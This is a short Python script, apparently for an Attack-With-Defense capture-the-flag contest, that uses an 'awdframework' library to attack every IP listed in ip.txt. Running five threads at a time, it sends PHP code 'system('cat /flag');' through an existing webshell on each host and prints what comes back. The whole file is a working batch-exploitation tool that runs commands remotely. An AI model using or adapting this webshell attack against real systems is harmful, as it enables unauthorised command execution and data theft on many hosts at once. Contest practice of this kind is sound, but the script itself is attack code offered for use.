from awdframework.awd import Attack,AwdTask
from ..models import Example
from os.path import dirname
class Exp(AwdTask):
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def attack_use_webshell(self,ip):
        resp = Example.test_available_and_eval(ip,"system('cat /flag');")
        print(resp.text)

attacker = Attack(f"{dirname(__file__)}/../../ip.txt",Exp,port=80,thread_num=5)
attacker.attack()